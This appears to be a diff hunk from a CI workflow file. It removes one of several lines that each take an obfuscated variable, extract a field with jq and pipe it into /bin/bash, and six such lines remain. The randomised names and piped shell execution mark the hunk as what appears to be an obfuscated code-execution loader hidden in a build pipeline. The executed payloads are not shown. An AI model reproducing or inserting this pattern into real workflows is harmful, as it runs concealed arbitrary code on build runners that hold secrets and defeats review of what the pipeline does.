@@ -21,7 +21,6 @@ jobs:
           echo $tgy25676 | jq -r .u192 | /bin/bash
           printf '%s' "$j22321" | jq -r .ra1 | /bin/bash
           echo $cypcj53517 | jq -r .ujra455 | /bin/bash
-          echo $bnvgt4 | jq -r .zmya365 | /bin/bash
           echo $jtr6 | jq -r .l34 | /bin/bash
           echo $x426 | jq -r .qtib66130 | /bin/bash
           printf '%s' "$ag5" | jq -r .fbp11 | /bin/bash
